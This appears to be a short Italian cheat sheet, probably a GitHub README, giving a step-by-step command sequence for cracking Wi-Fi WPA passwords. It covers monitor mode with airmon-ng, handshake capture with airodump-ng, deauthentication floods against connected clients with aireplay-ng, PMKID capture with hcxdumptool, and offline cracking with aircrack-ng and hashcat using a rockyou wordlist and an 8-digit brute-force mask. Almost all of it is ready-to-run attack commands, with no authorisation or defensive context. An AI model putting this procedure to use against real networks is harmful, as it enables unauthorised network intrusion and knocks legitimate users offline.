# Wi-Fi 
Visualizza scheda di rete 
```
ifconfig
```
oppure
```
ip a
```
avvia scheda di rete in monitor mode
```
sudo airmon-ng check kill
```

```
sudo airmon-ng start wlan0
```
esempio:
erpressa@kali:~# sudo airmon-ng start wlan0
avvia airodump-ng 
```
sudo airodump-ng wlan0mon 
```
copiare bssid e station
premi spazio oppure ctrl + c per terminare 
```
sudo airodump-ng --bssid FF:FF:FF:FF:FF:FF -c 1 -w /home/kali/handshake.cap wlan0mon
```
esempio
```
sudo airodump-ng --<BSSID> -c <CANALE> -w <PERCORSO-FILE> <INTERFACCIA> 
```

scollegare clients a=bssid c=clients
```
sudo aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF wlan0mon
```
oppure 
```
sudo aireplay-ng --deauth 1000 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF wlan0mon
```
cracking con aircrack-ng 
```

sudo aircrack-ng file.cap -w /home/kali/rockyou.txt
```
hcxdumptool
```
sudo hcxdumptool -i wlan1 -w frames_to_recover_the_psk.pcapng -F --rds=1
```

![Screenshot_20250314_020018](https://github.com/user-attachments/assets/a105cd91-522b-4488-8dd4-29b5c7b6754a)

```
hcxpcapngtool -o hash.hc22000 -E essidlist frames_to_recover_the_psk.pcapng
```
![Screenshot_20250314_015237](https://github.com/user-attachments/assets/eeed436d-d573-4c33-986f-15ea31dcf081)


```
sudo nano hash.hc22000
```

```
hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt
```
Bruteforce 8 numeri

```
hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d
```









































